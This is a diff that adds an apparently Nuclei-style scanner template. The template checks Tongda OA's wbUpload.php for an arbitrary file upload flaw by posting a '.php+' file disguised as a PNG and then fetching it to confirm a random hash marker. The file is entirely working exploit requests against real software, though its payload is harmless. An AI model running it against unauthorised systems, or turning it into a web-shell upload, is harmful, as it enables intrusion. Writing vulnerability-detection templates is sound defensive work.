@@ -1,0 +1,44 @@
+id: poc-tongda-oa-wbupload-anyfile-upload
+info:
+  name: Tongda OA wbUpload.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits an arbitrary file upload vulnerability in Tongda OA wbUpload.php.
+
+variables:
+  t1: "{{rand_int(100,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/general/vmeet/wbUpload.php?fileName={{t1}}.php+"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------307456622713326098592248556830
+    body: |-
+      -----------------------------307456622713326098592248556830
+      Content-Disposition: form-data; name="Filedata"; filename="1.png"
+      Content-Type: image/png
+
+      {{t2}}
+      -----------------------------307456622713326098592248556830--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/general/vmeet/wbUpload/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
